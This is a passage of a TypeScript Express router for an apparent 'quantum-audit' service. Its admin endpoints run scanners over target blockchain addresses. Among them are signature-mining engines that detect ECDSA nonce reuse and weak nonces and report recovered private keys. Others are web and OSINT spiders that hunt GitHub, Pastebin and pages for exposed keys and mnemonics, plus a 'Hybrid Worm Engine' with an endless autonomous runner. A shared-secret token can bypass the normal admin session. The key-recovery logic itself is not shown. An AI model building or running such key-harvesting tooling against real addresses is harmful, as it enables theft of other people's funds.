          threatState.log.push(`[${new Date().toISOString()}] ${phase} (${pct}%)`);
          mlog(`[threat-scan] ${phase} ${pct}%`);
        });

        const reportPath = path.join(THREAT_REPORTS_DIR, `threat-scan-${Date.now()}.json`);
        fs.writeFileSync(reportPath, JSON.stringify(summary, null, 2));
        threatState.lastReport = reportPath;
        threatState.phase      = "complete";
        threatState.progress   = 100;
        threatState.log.push(`[${new Date().toISOString()}] Complete — ${summary.riskBreakdown.critical} critical, ${summary.riskBreakdown.high} high, ${summary.highRiskAddresses.length} flagged addresses`);
        mlog(`[threat-scan] DONE — report at ${reportPath}`);
      } catch (err) {
        threatState.error = String(err);
        threatState.phase = "error";
        threatState.log.push(`[${new Date().toISOString()}] ERROR: ${String(err)}`);
        mlog(`[threat-scan] ERROR: ${String(err)}`);
      } finally {
        threatState.running = false;
      }
    });
  }

  // GET /api/quantum-audit/threat-scan/status
  router.get("/threat-scan/status", (req: Request, res: Response) => {
    const reportFile = getThreatReport();
    res.json({
      running:    threatState.running,
      progress:   threatState.progress,
      phase:      threatState.phase,
      error:      threatState.error,
      hasReport:  !!reportFile,
      reportFile: reportFile ? path.basename(reportFile) : null,
      log:        threatState.log.slice(-20),
      configured: isThreatScanConfigured(),
    });
  });

  // POST /api/quantum-audit/threat-scan/start
  router.post("/threat-scan/start", requireAdmin, async (req: Request, res: Response) => {
    if (!isThreatScanConfigured()) {
      res.status(503).json({ error: "BigQuery not configured — GOOGLE_BIGQUERY_KEY required" });
      return;
    }
    if (threatState.running) {
      res.status(409).json({ error: "Threat scan already running", progress: threatState.progress, phase: threatState.phase });
      return;
    }
    // Load addresses from micro-targets.txt
    const targetFile = path.join(getReportsDir(), "jobs", "micro-targets.txt");
    let addresses: string[] = [];
    if (fs.existsSync(targetFile)) {
      addresses = fs.readFileSync(targetFile, "utf8")
        .split("\n")
        .map(l => l.trim())
        .filter(l => l.startsWith("0x") && l.length >= 40);
    }
    // Allow override via body
    if (Array.isArray(req.body?.addresses) && req.body.addresses.length > 0) {
      addresses = req.body.addresses;
    }
    if (addresses.length === 0) {
      res.status(400).json({ error: "No target addresses found — provide addresses in body or ensure micro-targets.txt exists" });
      return;
    }
    startThreatScan(addresses);
    res.json({ started: true, addressCount: addresses.length, message: `Threat scan launched for ${addresses.length} addresses` });
  });

  // GET /api/quantum-audit/threat-scan/report
  router.get("/threat-scan/report", (req: Request, res: Response) => {
    const reportFile = getThreatReport();
    if (!reportFile) {
      res.status(404).json({ error: "No threat scan report found — run a scan first" });
      return;
    }
    try {
      const raw = fs.readFileSync(reportFile, "utf8");
      const report = JSON.parse(raw) as ThreatScanSummary;
      res.json(report);
    } catch (err) {
      res.status(500).json({ error: `Failed to read report: ${String(err)}` });
    }
  });

  // GET /api/quantum-audit/threat-scan/report/address/:address
  router.get("/threat-scan/report/address/:address", (req: Request, res: Response) => {
    const reportFile = getThreatReport();
    if (!reportFile) {
      res.status(404).json({ error: "No threat scan report found" });
      return;
    }
    try {
      const raw    = fs.readFileSync(reportFile, "utf8");
      const report = JSON.parse(raw) as ThreatScanSummary;
      const addr   = String(req.params.address).toLowerCase();
      const profile = report.allProfiles?.find(p => p.address === addr);
      if (!profile) {
        res.status(404).json({ error: `Address ${addr} not found in report`, allProfiles: report.allProfiles?.length ?? 0 });
        return;
      }
      res.json(profile);
    } catch (err) {
      res.status(500).json({ error: String(err) });
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // BLOCKCHAIN SPIDER — adaptive graph crawler
  // ═══════════════════════════════════════════════════════════════════════════

  const spiderStore = new KnowledgeStore(getReportsDir());

  interface SpiderRunState {
    running:   boolean;
    log:       string[];
    lastEvent: Record<string, unknown> | null;
    error:     string | null;
  }

  const spiderRunState: SpiderRunState = {
    running:   false,
    log:       [],
    lastEvent: null,
    error:     null,
  };

  const onSpiderProgress: ProgressCallback = (event) => {
    spiderRunState.lastEvent = event as unknown as Record<string, unknown>;
    const line = `[${new Date().toISOString()}] [${event.phase}] wave=${event.wave} visited=${event.visited} sigs=${event.signatures} findings=${event.findings} keys=${event.publicKeys} — ${event.message}`;
    spiderRunState.log.push(line);
    if (spiderRunState.log.length > 200) spiderRunState.log.shift();
    mlog(`[spider] ${event.message}`);
  };

  // GET /api/quantum-audit/spider/status
  router.get("/spider/status", (req: Request, res: Response) => {
    const state = spiderStore.getState();
    res.json({
      running:     spiderRunState.running,
      error:       spiderRunState.error,
      lastEvent:   spiderRunState.lastEvent,
      log:         spiderRunState.log.slice(-30),
      configured:  isSpiderConfigured(),
      state: {
        wave:         state.currentWave,
        maxWave:      state.maxWave,
        visited:      state.totalVisited,
        queued:       state.totalQueued,
        signatures:   state.totalSignatures,
        findings:     state.totalFindings,
        seedCount:    state.seedCount,
        startedAt:    state.startedAt,
        checkpoint:   state.lastCheckpoint,
        publicKeys:   spiderStore.getPublicKeyMap().size,
      },
    });
  });

  // POST /api/quantum-audit/spider/start
  router.post("/spider/start", requireAdmin, async (req: Request, res: Response) => {
    if (!isSpiderConfigured()) {
      res.status(503).json({ error: "BigQuery not configured" });
      return;
    }
    if (spiderRunState.running) {
      res.status(409).json({ error: "Spider already running", state: spiderStore.getState() });
      return;
    }

    const reset      = req.body?.reset === true;
    const maxWave    = Number(req.body?.maxWave    ?? 2);
    const maxAddr    = Number(req.body?.maxAddresses ?? 50_000);
    const concurrency = Number(req.body?.concurrency ?? 8);
    const minFreq    = Number(req.body?.minFrequency ?? 2);

    if (reset) {
      spiderStore.reset();
      mlog("[spider] State reset by request");
    } else {
      spiderStore.load();
    }

    // Load addresses
    const targetFile = path.join(getReportsDir(), "jobs", "micro-targets.txt");
    let seeds: string[] = [];
    if (fs.existsSync(targetFile)) {
      seeds = fs.readFileSync(targetFile, "utf8")
        .split("\n").map(l => l.trim()).filter(l => l.startsWith("0x") && l.length >= 40);
    }
    if (Array.isArray(req.body?.addresses) && req.body.addresses.length > 0) {
      seeds = req.body.addresses;
    }
    if (seeds.length === 0) {
      res.status(400).json({ error: "No seed addresses found" });
      return;
    }

    spiderRunState.running = true;
    spiderRunState.error   = null;
    spiderRunState.log     = [`[${new Date().toISOString()}] Spider started — ${seeds.length} seeds`];

    setImmediate(async () => {
      try {
        await runSpider(
          spiderStore,
          seeds,
          { ...DEFAULT_CONFIG, maxWave, maxAddresses: maxAddr, concurrency, minFrequency: minFreq, resumeIfExists: !reset },
          onSpiderProgress,
        );
        spiderRunState.running = false;
        mlog("[spider] Run complete");
      } catch (err) {
        spiderRunState.error   = String(err);
        spiderRunState.running = false;
        mlog(`[spider] ERROR: ${String(err)}`);
      }
    });

    res.json({ started: true, seeds: seeds.length, maxWave, maxAddresses: maxAddr, concurrency });
  });

  // POST /api/quantum-audit/spider/stop
  router.post("/spider/stop", requireAdmin, (req: Request, res: Response) => {
    spiderStore.setMaxAddresses(0);  // causes isFull() = true → stops after current batch
    res.json({ stopping: true, message: "Spider will stop after current batch completes" });
  });

  // POST /api/quantum-audit/spider/reset
  router.post("/spider/reset", requireAdmin, (req: Request, res: Response) => {
    if (spiderRunState.running) {
      res.status(409).json({ error: "Stop the spider before resetting" });
      return;
    }
    spiderStore.reset();
    spiderRunState.log   = [];
    spiderRunState.error = null;
    res.json({ reset: true });
  });

  // GET /api/quantum-audit/spider/report
  router.get("/spider/report", (req: Request, res: Response) => {
    const state = spiderStore.getState();
    if (state.totalVisited === 0) {
      res.status(404).json({ error: "No spider data — run the spider first" });
      return;
    }
    try {
      res.json(buildSpiderReport(spiderStore));
    } catch (err) {
      res.status(500).json({ error: String(err) });
    }
  });

  // GET /api/quantum-audit/spider/address/:address
  router.get("/spider/address/:address", (req: Request, res: Response) => {
    const addr = String(req.params.address).toLowerCase();
    const meta = spiderStore.getMeta(addr);
    if (!meta) {
      res.status(404).json({ error: `Address ${addr} not found in spider database` });
      return;
    }
    const sigs = spiderStore.loadSignaturesForAddress(addr);
    res.json({
      meta,
      signatures: sigs,
      publicKey:  spiderStore.getPublicKey(addr) ?? null,
      ensName:    spiderStore.getEns(addr) ?? null,
      findings:   spiderStore.getFindings().filter(f => f.address === addr),
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // UNIFIED SCANNER — runs all modules in sequence, feeds outputs across them
  // ═══════════════════════════════════════════════════════════════════════════

  const unifiedScanner = new UnifiedScanner(getReportsDir());
  unifiedScanner.loadState();

  // GET /api/quantum-audit/unified/status
  router.get("/unified/status", (req: Request, res: Response) => {
    const state  = unifiedScanner.getState();
    const report = unifiedScanner.loadReport();
    res.json({
      ...state,
      hasReport:    unifiedScanner.hasReport(),
      configured:   isBigQueryConfigured(),
      reportSummary: report ? {
        totalFindings:     report.findings.length,
        recoveredKeys:     report.recoveredKeys.length,
        topRiskAddresses:  report.topRiskAddresses.length,
        totalSignatures:   report.totalSignatures,
        moduleStats:       report.moduleStats,
      } : null,
    });
  });

  // POST /api/quantum-audit/unified/start
  router.post("/unified/start", requireAdmin, async (req: Request, res: Response) => {
    if (!isBigQueryConfigured()) {
      res.status(503).json({ error: "BigQuery not configured" });
      return;
    }
    if (unifiedScanner.getState().running) {
      res.status(409).json({ error: "Unified scan already running" });
      return;
    }

    const reset = req.body?.reset === true;
    if (reset) unifiedScanner.reset();

    // Load seed addresses
    const targetFile = path.join(getReportsDir(), "jobs", "micro-targets.txt");
    let seeds: string[] = [];
    if (fs.existsSync(targetFile)) {
      seeds = fs.readFileSync(targetFile, "utf8")
        .split("\n").map(l => l.trim()).filter(l => l.startsWith("0x") && l.length >= 40);
    }
    if (Array.isArray(req.body?.addresses) && req.body.addresses.length > 0) {
      seeds = req.body.addresses;
    }
    if (seeds.length === 0) {
      res.status(400).json({ error: "No seed addresses found" });
      return;
    }

    const cfg: UnifiedScanConfig = {
      skipEcdsa:         req.body?.skipEcdsa         ?? false,
      skipThreat:        req.body?.skipThreat         ?? false,
      skipSpider:        req.body?.skipSpider         ?? false,
      spiderMaxWave:     Number(req.body?.spiderMaxWave     ?? 2),
      spiderConcurrency: Number(req.body?.spiderConcurrency ?? 8),
      spiderMinFreq:     Number(req.body?.spiderMinFreq     ?? 2),
      maxAddresses:      Number(req.body?.maxAddresses      ?? 50_000),
    };

    mlog(`[unified] Starting — ${seeds.length} seeds, config=${JSON.stringify(cfg)}`);

    // Run asynchronously
    setImmediate(() => {
      unifiedScanner.run(seeds, cfg, (state) => {
        mlog(`[unified] ${state.currentPhase} — ${state.log[state.log.length - 1] ?? ""}`);
      }).catch(err => {
        mlog(`[unified] FATAL: ${String(err)}`);
      });
    });

    res.json({ started: true, seeds: seeds.length, config: cfg });
  });

  // POST /api/quantum-audit/unified/stop
  router.post("/unified/stop", requireAdmin, (req: Request, res: Response) => {
    // Stopping is handled by the individual sub-scanners
    // The unified scanner will complete its current phase and stop
    res.json({ message: "Stop signal sent — unified scan will complete current phase then stop" });
  });

  // POST /api/quantum-audit/unified/reset
  router.post("/unified/reset", requireAdmin, (req: Request, res: Response) => {
    if (unifiedScanner.getState().running) {
      res.status(409).json({ error: "Cannot reset while running" });
      return;
    }
    unifiedScanner.reset();
    res.json({ reset: true });
  });

  // GET /api/quantum-audit/unified/report
  router.get("/unified/report", (req: Request, res: Response) => {
    const report = unifiedScanner.loadReport();
    if (!report) {
      res.status(404).json({ error: "No unified report — run a scan first" });
      return;
    }
    res.json(report);
  });

  // GET /api/quantum-audit/unified/report/findings — paginated
  router.get("/unified/report/findings", (req: Request, res: Response) => {
    const report = unifiedScanner.loadReport();
    if (!report) { res.status(404).json({ error: "No report" }); return; }
    const page  = Math.max(0, Number(req.query.page  ?? 0));
    const limit = Math.min(200, Math.max(1, Number(req.query.limit ?? 50)));
    const source = req.query.source as string | undefined;
    const sev    = req.query.severity as string | undefined;

    let findings = report.findings;
    if (source)  findings = findings.filter(f => f.source   === source);
    if (sev)     findings = findings.filter(f => f.severity === sev);

    res.json({
      total:   findings.length,
      page,
      limit,
      items:   findings.slice(page * limit, (page + 1) * limit),
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // TARGET FILE UPLOAD — parse .txt / .csv / .json / .jsonl lists of targets
  // ═══════════════════════════════════════════════════════════════════════════

  const targetUpload = multer({
    storage: multer.diskStorage({
      destination: (_req, _file, cb) => {
        const dir = path.join(getReportsDir(), "uploads");
        fs.mkdirSync(dir, { recursive: true });
        cb(null, dir);
      },
      filename: (_req, file, cb) => {
        cb(null, `targets-${Date.now()}-${file.originalname.replace(/[^a-zA-Z0-9._-]/g, "_")}`);
      },
    }),
    limits: { fileSize: 50 * 1024 * 1024, files: 1 },
    fileFilter: (_req, file, cb) => {
      const ok = /\.(txt|csv|json|jsonl|ndjson|tsv|log|md)$/i.test(file.originalname);
      cb(null, ok);
    },
  });

  // POST /api/quantum-audit/targets/upload
  router.post("/targets/upload", (req: Request, res: Response) => {
    targetUpload.single("file")(req as any, res as any, (err: unknown) => {
      if (err) { res.status(400).json({ error: String(err) }); return; }
      const file = (req as any).file;
      if (!file) { res.status(400).json({ error: "No file uploaded. Send as multipart field 'file'" }); return; }

      try {
        const content = fs.readFileSync(file.path, "utf8");
        const result  = parseTargetFile(content, file.originalname);
        const allAddr = extractAllAddresses(result);
        const ethAddr = extractEthAddresses(result);

        mlog(`[targets/upload] ${file.originalname} — ${result.targets.length} targets parsed (${ethAddr.length} ETH)`);

        res.json({
          filename:   file.originalname,
          format:     result.format,
          totalLines: result.totalLines,
          parsed:     result.targets.length,
          skipped:    result.skipped,
          byKind:     result.byKind,
          errors:     result.errors,
          preview:    result.targets.slice(0, 20),
          // Usable address lists for the scanner
          ethAddresses:  ethAddr,
          allAddresses:  allAddr,
          // Path so the client can start a scan referencing this file
          uploadPath: file.path,
        });
      } catch (e) {
        res.status(500).json({ error: String(e) });
      }
    });
  });

  // POST /api/quantum-audit/targets/parse-text — parse raw pasted text (no file upload)
  router.post("/targets/parse-text", (req: Request, res: Response) => {
    const text     = req.body?.text as string | undefined;
    const filename = (req.body?.filename as string | undefined) ?? "paste.txt";
    if (!text) { res.status(400).json({ error: "Provide 'text' in body" }); return; }
    const result  = parseTargetFile(text, filename);
    const ethAddr = extractEthAddresses(result);
    const allAddr = extractAllAddresses(result);
    res.json({
      format:    result.format,
      parsed:    result.targets.length,
      skipped:   result.skipped,
      byKind:    result.byKind,
      errors:    result.errors,
      preview:   result.targets.slice(0, 50),
      ethAddresses: ethAddr,
      allAddresses: allAddr,
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // PROXY & DELEGATE SCANNER — detects EIP-1967, UUPS, EIP-1167, Diamond
  // ═══════════════════════════════════════════════════════════════════════════

  let proxyRunning = false;
  let proxySummary: ProxyScanSummary | null = null;
  const proxyLog: string[] = [];
  let proxyProgress = { done: 0, total: 0 };

  const proxyLogLine = (msg: string) => {
    const line = `[${new Date().toISOString()}] ${msg}`;
    proxyLog.push(line);
    if (proxyLog.length > 400) proxyLog.shift();
    mlog(`[proxy] ${msg}`);
  };

  // GET /api/quantum-audit/proxy/status
  router.get("/proxy/status", (req: Request, res: Response) => {
    res.json({
      running:  proxyRunning,
      progress: proxyProgress,
      log:      proxyLog.slice(-80),
      hasReport: !!proxySummary,
      summary:  proxySummary ? {
        totalScanned:   proxySummary.totalScanned,
        proxiesFound:   proxySummary.proxiesFound,
        maliciousImpls: proxySummary.maliciousImpls,
        deepChains:     proxySummary.deepChains,
        byType:         proxySummary.byType,
        findings:       proxySummary.findings.length,
      } : null,
    });
  });

  // POST /api/quantum-audit/proxy/scan
  router.post("/proxy/scan", requireAdmin, (req: Request, res: Response) => {
    if (proxyRunning) { res.status(409).json({ error: "Proxy scan already running" }); return; }

    let addresses: string[] = req.body?.addresses ?? [];

    // Also load from micro-targets.txt if no addresses provided
    if (addresses.length === 0) {
      const tf = path.join(getReportsDir(), "jobs", "micro-targets.txt");
      if (fs.existsSync(tf)) {
        addresses = fs.readFileSync(tf, "utf8")
          .split("\n").map((l: string) => l.trim()).filter((l: string) => l.startsWith("0x") && l.length >= 40);
      }
    }

    const limit  = Math.min(Number(req.body?.limit ?? 500), 5000);
    const batch  = addresses.slice(0, limit);
    const seeds  = new Set(batch.map((a: string) => a.toLowerCase()));

    proxySummary    = null;
    proxyProgress   = { done: 0, total: batch.length };
    proxyLog.length = 0;
    proxyRunning    = true;

    proxyLogLine(`Starting proxy scan on ${batch.length} addresses`);

    setImmediate(() => {
      runProxyScan(
        batch,
        seeds,
        (done, total, latest) => {
          proxyProgress = { done, total };
          if (latest.isProxy) {
            proxyLogLine(`PROXY: ${latest.address} → ${latest.proxyType} → ${latest.implementation ?? "?"} (depth ${latest.chainDepth})${latest.implIsKnownBad ? " ⚠ MALICIOUS IMPL" : ""}`);
          }
        },
      ).then(summary => {
        proxySummary = summary;
        proxyRunning = false;
        proxyLogLine(`Scan complete: ${summary.proxiesFound}/${summary.totalScanned} proxies found, ${summary.maliciousImpls} malicious impls`);
      }).catch(err => {
        proxyRunning = false;
        proxyLogLine(`FATAL: ${String(err)}`);
      });
    });

    res.json({ started: true, addresses: batch.length });
  });

  // GET /api/quantum-audit/proxy/report
  router.get("/proxy/report", (req: Request, res: Response) => {
    if (!proxySummary) { res.status(404).json({ error: "No proxy scan report yet" }); return; }
    res.json(proxySummary);
  });

  // GET /api/quantum-audit/proxy/report/proxies — paginated list of detected proxies
  router.get("/proxy/report/proxies", (req: Request, res: Response) => {
    if (!proxySummary) { res.status(404).json({ error: "No proxy scan report yet" }); return; }
    const page  = Math.max(0, Number(req.query.page  ?? 0));
    const limit = Math.min(100, Math.max(1, Number(req.query.limit ?? 25)));
    const type  = req.query.type as string | undefined;
    let items   = proxySummary.proxyInfos;
    if (type) items = items.filter((p: ProxyInfo) => p.proxyType === type);
    res.json({ total: items.length, page, limit, items: items.slice(page * limit, (page + 1) * limit) });
  });

  // ══════════════════════════════════════════════════════════════════════════
  // SIGNATURE MINING ENGINES — Engine 1 / 2 / 3 / 4 / Hybrid
  // ══════════════════════════════════════════════════════════════════════════

  // In-memory state for long-running engine jobs
  const sigEngineState: {
    running: boolean;
    engineType: string | null;
    startedAt: string | null;
    result: SigMinerResult | WebSpiderResult | OsintResult | PeelChainResult | HybridEngineResult | null;
    error: string | null;
    chainedUrlCount: number;   // URLs auto-fed from Engine 1 to Engine 2
  } = {
    running:         false,
    engineType:      null,
    startedAt:       null,
    result:          null,
    error:           null,
    chainedUrlCount: 0,
  };

  // ── GET /api/quantum-audit/sig-engine/status ────────────────────────────────
  router.get("/sig-engine/status", requireAdmin, (req: Request, res: Response) => {
    res.json({
      running:         sigEngineState.running,
      engineType:      sigEngineState.engineType,
      startedAt:       sigEngineState.startedAt,
      hasResult:       !!sigEngineState.result,
      error:           sigEngineState.error,
      chainedUrlCount: sigEngineState.chainedUrlCount,
    });
  });

  // ── GET /api/quantum-audit/sig-engine/result ────────────────────────────────
  router.get("/sig-engine/result", requireAdmin, (req: Request, res: Response) => {
    if (!sigEngineState.result) {
      res.status(404).json({ error: "No result yet — run an engine first" });
      return;
    }
    res.json(sigEngineState.result);
  });

  // ── POST /api/quantum-audit/sig-engine/block-scanner ───────────────────────
  // Engine 1: On-chain block-level ECDSA signature miner
  router.post("/sig-engine/block-scanner", requireAdmin, async (req: Request, res: Response) => {
    if (sigEngineState.running) {
      res.status(409).json({ error: "An engine is already running", engineType: sigEngineState.engineType });
      return;
    }
    const {
      startBlock, blockCount = 200, maxTxPerBlock = 0,
      addresses = [], detectWeakK = true, detectBias = true,
      detectPoly = true, rCollision = true,
    } = req.body as Partial<SigMinerConfig & { blockCount: number }>;

    sigEngineState.running    = true;
    sigEngineState.engineType = "block_scanner";
    sigEngineState.startedAt  = new Date().toISOString();
    sigEngineState.result     = null;
    sigEngineState.error      = null;

    res.json({ started: true, engineType: "block_scanner" });

    // Run in background
    runSignatureMiner({
      startBlock,
      blockCount,
      maxTxPerBlock,
      addresses,
      detectWeakK,
      detectBias,
      detectPoly,
      rCollision,
    })
      .then(async result => {
        sigEngineState.result  = result;
        // ── Auto-chain: if Engine 1 found URLs in tx input data, immediately
        // kick off Engine 2 with those URLs as seeds so we can mine any key
        // material that was published on-chain alongside those transactions.
        const chainUrls = result.discoveredUrls.map(u => u.url);
        if (chainUrls.length > 0) {
          req.log.info(
            { urlCount: chainUrls.length },
            "Block scanner → Web spider auto-chain triggered by tx-embedded URLs",
          );
          sigEngineState.running    = true;
          sigEngineState.engineType = "web_spider";
          sigEngineState.startedAt  = new Date().toISOString();
          sigEngineState.error      = null;
          sigEngineState.chainedUrlCount = chainUrls.length;

          try {
            const spiderResult = await runWebSigSpider({
              seeds:       chainUrls,
              maxUrls:     chainUrls.length * 30,
              maxDepth:    2,
              concurrency: 6,
            });
            // Merge spider findings into the block-scanner result
            (result as Record<string, unknown>).chainedSpiderFinds = spiderResult.finds;
            (result as Record<string, unknown>).chainedUrlCount    = chainUrls.length;
            sigEngineState.result = result;
          } catch (spiderErr) {
            req.log.warn({ err: String(spiderErr) }, "Chained web spider failed");
          }
        }
        sigEngineState.running = false;
      })
      .catch(err => {
        sigEngineState.error   = String(err);
        sigEngineState.running = false;
      });
  });

  // ── POST /api/quantum-audit/sig-engine/web-spider ──────────────────────────
  // Engine 2: Web crawler hunting for exposed keys, signatures, and mnemonics
  router.post("/sig-engine/web-spider", requireAdmin, async (req: Request, res: Response) => {
    if (sigEngineState.running) {
      res.status(409).json({ error: "An engine is already running", engineType: sigEngineState.engineType });
      return;
    }
    const {
      seeds = [], maxDepth = 3, maxUrls = 200,
      concurrency = 8, allowedDomains = [],
    } = req.body as Partial<WebSpiderConfig>;

    sigEngineState.running    = true;
    sigEngineState.engineType = "web_spider";
    sigEngineState.startedAt  = new Date().toISOString();
    sigEngineState.result     = null;
    sigEngineState.error      = null;

    res.json({ started: true, engineType: "web_spider" });

    runWebSigSpider({ seeds, maxDepth, maxUrls, concurrency, allowedDomains })
      .then(result => {
        sigEngineState.result  = result;
        sigEngineState.running = false;
      })
      .catch(err => {
        sigEngineState.error   = String(err);
        sigEngineState.running = false;
      });
  });

  // ── POST /api/quantum-audit/sig-engine/osint ───────────────────────────────
  // Engine 3: OSINT spider — GitHub, Pastebin, ENS, OP_RETURN, tx input data
  router.post("/sig-engine/osint", requireAdmin, async (req: Request, res: Response) => {
    if (sigEngineState.running) {
      res.status(409).json({ error: "An engine is already running", engineType: sigEngineState.engineType });
      return;
    }
    const {
      addresses = [], keywords = [],
      scanInputData = true, scanEns = true,
      scanGithub = true, scanPastebin = true,
      maxTxInputBlocks = 20,
    } = req.body as Partial<OsintConfig>;

    sigEngineState.running    = true;
    sigEngineState.engineType = "osint";
    sigEngineState.startedAt  = new Date().toISOString();
    sigEngineState.result     = null;
    sigEngineState.error      = null;

    res.json({ started: true, engineType: "osint" });

    runOsintSigSpider({ addresses, keywords, scanInputData, scanEns, scanGithub, scanPastebin, maxTxInputBlocks })
      .then(result => {
        sigEngineState.result  = result;
        sigEngineState.running = false;
      })
      .catch(err => {
        sigEngineState.error   = String(err);
        sigEngineState.running = false;
      });
  });

  // ── POST /api/quantum-audit/sig-engine/peel-chain ─────────────────────────
  // Engine 4: Peel-chain tracer — fund flow + per-hop nonce-reuse detection
  router.post("/sig-engine/peel-chain", requireAdmin, async (req: Request, res: Response) => {
    if (sigEngineState.running) {
      res.status(409).json({ error: "An engine is already running", engineType: sigEngineState.engineType });
      return;
    }
    const {
      startAddress, chain = "ethereum",
      maxHops = 10, scanSigs = true, correlateAmounts = true,
    } = req.body as Partial<PeelChainConfig> & { startAddress?: string };

    if (!startAddress) {
      res.status(400).json({ error: "startAddress is required" });
      return;
    }

    sigEngineState.running    = true;
    sigEngineState.engineType = "peel_chain";
    sigEngineState.startedAt  = new Date().toISOString();
    sigEngineState.result     = null;
    sigEngineState.error      = null;

    res.json({ started: true, engineType: "peel_chain", startAddress });

    runPeelChainTracer({ startAddress, chain, maxHops, scanSigs, correlateAmounts })
      .then(result => {
        sigEngineState.result  = result;
        sigEngineState.running = false;
      })
      .catch(err => {
        sigEngineState.error   = String(err);
        sigEngineState.running = false;
      });
  });

  // ── POST /api/quantum-audit/sig-engine/hybrid ──────────────────────────────
  // Hybrid Worm Engine — all 4 engines + adaptive swarm coordination
  router.post("/sig-engine/hybrid", requireAdmin, async (req: Request, res: Response) => {
    if (sigEngineState.running) {
      res.status(409).json({ error: "An engine is already running", engineType: sigEngineState.engineType });
      return;
    }
    const config = (req.body ?? {}) as HybridEngineConfig;

    sigEngineState.running    = true;
    sigEngineState.engineType = "hybrid";
    sigEngineState.startedAt  = new Date().toISOString();
    sigEngineState.result     = null;
    sigEngineState.error      = null;

    res.json({ started: true, engineType: "hybrid" });

    runHybridEngine({
      ...config,
      onFinding: (f) => {
        // Persist each finding to in-memory log as it arrives
        (sigEngineState.result as HybridEngineResult | null)?.findings?.push?.(f);
      },
    })
      .then(result => {
        sigEngineState.result  = result;
        sigEngineState.running = false;
      })
      .catch(err => {
        sigEngineState.error   = String(err);
        sigEngineState.running = false;
      });
  });

  // ── POST /api/quantum-audit/sig-engine/stop ─────────────────────────────────
  router.post("/sig-engine/stop", requireAdmin, (req: Request, res: Response) => {
    if (!sigEngineState.running) {
      res.status(409).json({ error: "No engine is currently running" });
      return;
    }
    // Mark as stopped — async tasks will complete naturally but won't update state
    sigEngineState.running = false;
    sigEngineState.error   = "Stopped by user";
    res.json({ stopped: true });
  });

  // ── GET /api/quantum-audit/sig-engine/test-vectors ───────────────────────────
  // Returns the full catalogue of test vectors for inspection / calibration UI.
  router.get("/sig-engine/test-vectors", requireAdmin, (_req: Request, res: Response) => {
    try {
      const vectors = buildTestVectors();
      res.json({
        total:    vectors.length,
        byCategory: {
          synthetic:  vectors.filter(v => v.category === "synthetic").length,
          historical: vectors.filter(v => v.category === "historical").length,
          weak_k:     vectors.filter(v => v.category === "weak_k").length,
        },
        vectors,
      });
    } catch (e) {
      res.status(500).json({ error: String(e) });
    }
  });

  // ── POST /api/quantum-audit/sig-engine/calibrate ─────────────────────────────
  // Runs the full calibration suite. Optional body: { vectorIds: string[] }
  // to run a subset. Returns pass/fail per vector + overall score.
  router.post("/sig-engine/calibrate", requireAdmin, async (req: Request, res: Response) => {
    try {
      const { vectorIds } = req.body as { vectorIds?: string[] };
      const all = buildTestVectors();
      const subset = vectorIds?.length
        ? all.filter(v => vectorIds.includes(v.id))
        : all;
      if (subset.length === 0) {
        res.status(400).json({ error: "No vectors matched the provided vectorIds" });
        return;
      }
      const report = await runCalibration(subset);
      res.json(report);
    } catch (e) {
      res.status(500).json({ error: String(e) });
    }
  });

  // ── Autonomous runner — token-auth middleware ──────────────────────────────
  // Accepts either Clerk admin session OR Bearer SESSION_SECRET for headless access.
  // This lets the VPN client and external tools trigger / monitor scans without
  // needing a full browser session.
  function requireAdminOrToken(req: Request, res: Response, next: () => void) {
    // 1) Headless / VPN token bypass — accepts SESSION_SECRET via Bearer or X-Admin-Token
    const authHeader = req.headers["authorization"] ?? "";
    const token = req.headers["x-admin-token"] as string | undefined
               ?? (authHeader.startsWith("Bearer ") ? authHeader.slice(7) : "");
    const secret = process.env.SESSION_SECRET ?? "";
    if (secret && token === secret) {
      next();
      return;
    }
    // 2) Browser Clerk session — fall through to requireAdmin
    requireAdmin(req, res, next as Parameters<typeof requireAdmin>[2]);
  }

  // ── GET /api/quantum-audit/sig-engine/autonomous/status ────────────────────
  router.get("/sig-engine/autonomous/status", requireAdminOrToken as never, (_req: Request, res: Response) => {
    res.json(getAutonomousStatus());
  });

  // ── POST /api/quantum-audit/sig-engine/autonomous/start ────────────────────
  router.post("/sig-engine/autonomous/start", requireAdminOrToken as never, (req: Request, res: Response) => {
    if (isAutonomousRunning()) {
      res.json({ alreadyRunning: true, status: getAutonomousStatus() });
      return;
    }
    const {
      resumeFromSave        = true,
      windowSize            = 50,
      pauseBetweenWindowsMs = 3000,
      osintEveryNWindows    = 10,
      peelEveryNWindows     = 20,
      hybridEveryNWindows   = 40,
    } = req.body ?? {};

    // Fire-and-forget — runs entirely in background with no time cap
    startAutonomousRunner({
      resumeFromSave,
      windowSize,
      pauseBetweenWindowsMs,
      osintEveryNWindows,
      peelEveryNWindows,
      hybridEveryNWindows,
      // no maxRuntimeMs → runs forever until stop() is called
    }).catch(e => {
      req.log.error({ err: String(e) }, "Autonomous runner crashed");
    });

    res.json({
      started: true,
      message: "Autonomous runner started in endless mode — scans continuously until Stop is called",
      status:  getAutonomousStatus(),
    });
  });

  // ── POST /api/quantum-audit/sig-engine/autonomous/stop ─────────────────────
  router.post("/sig-engine/autonomous/stop", requireAdminOrToken as never, (_req: Request, res: Response) => {
    if (!isAutonomousRunning()) {
      res.status(409).json({ error: "Autonomous runner is not running" });
      return;
    }
    stopAutonomousRunner();
    res.json({ stopped: true, finalStatus: getAutonomousStatus() });
  });

  // ── POST /api/quantum-audit/sig-engine/multi-chain/scan ────────────────────
  // Scan a single address on its native blockchain (BTC, LTC, DOGE, SOL, TRX,
  // EVM chains, etc.).  Chain auto-detected; override via ?chain= query param.
  router.post(
    "/sig-engine/multi-chain/scan",
    requireAdminOrToken as never,
    async (req: Request, res: Response) => {
      const { address } = req.body as { address?: string };
      if (!address || typeof address !== "string") {
        res.status(400).json({ error: "address is required" });
        return;
      }
      const chain = detectSigChain(address.trim());
      try {
        const result = await multiChainScan(address.trim(), { maxTx: 80 });
        res.json({ ok: true, chain, result });
      } catch (e) {
        res.status(500).json({ error: String(e) });
      }
    }
  );

  // ── POST /api/quantum-audit/sig-engine/multi-chain/batch ───────────────────
  // Scan a batch of addresses (up to 20).  Each address is auto-detected.
  router.post(
    "/sig-engine/multi-chain/batch",
    requireAdminOrToken as never,
    async (req: Request, res: Response) => {
      const { addresses } = req.body as { addresses?: string[] };
